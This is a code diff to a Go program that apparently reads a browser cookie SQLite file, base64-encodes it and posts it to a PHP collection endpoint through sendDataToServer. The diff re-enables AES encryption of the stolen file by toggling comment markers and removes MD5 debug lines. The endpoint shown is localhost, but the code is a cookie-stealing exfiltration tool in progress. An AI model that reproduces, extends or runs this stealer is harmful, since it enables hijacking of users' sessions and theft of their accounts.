@@ -11,8 +11,8 @@ import (
     "io/ioutil"
     "os/user"
     _ "os"
-    _ "crypto/cipher"
-    _ "crypto/aes"
+    "crypto/cipher"
+    "crypto/aes"
 	_ "crypto/md5"
 )
 
@@ -27,7 +27,7 @@ func encryptSQLiteFile(inputFile string, key []byte) (string, error) {
         return "", err
     }
     // Create AES Cipher block
-    /*
+    ///*
     block, err := aes.NewCipher(key)
     if err != nil {
         return "", err
@@ -40,7 +40,7 @@ func encryptSQLiteFile(inputFile string, key []byte) (string, error) {
     // Encrypt
     outputBytes := make([]byte, len(inputBytes))
     stream.XORKeyStream(outputBytes, inputBytes)
-    */ 
+    //*/ 
     encoded := base64.StdEncoding.EncodeToString(inputBytes)
     return encoded, nil
 
@@ -119,16 +119,11 @@ func main() {
             fmt.Println("%s.\n", os)
     }
     // Encrypt and base64 cookies
-    //sqliteEncoded, err := encryptSQLiteFile(defaultFilePath, keyBytes)
     base64Encoded, err := base64SQLiteFile(defaultFilePath)
     if err != nil {
         fmt.Println("ERROR", err)                
     }
     fmt.Println(base64Encoded)
     sendDataToServer(base64Encoded, "http://localhost:8080/index.php")
-    // Keep this commented when running. 
-    //_ data := []byte(base64Encoded)
-    //fmt.Println("\n\nMD5 Sum\n")
-    //fmt.Printf("%x", md5.Sum(data))
 }
 
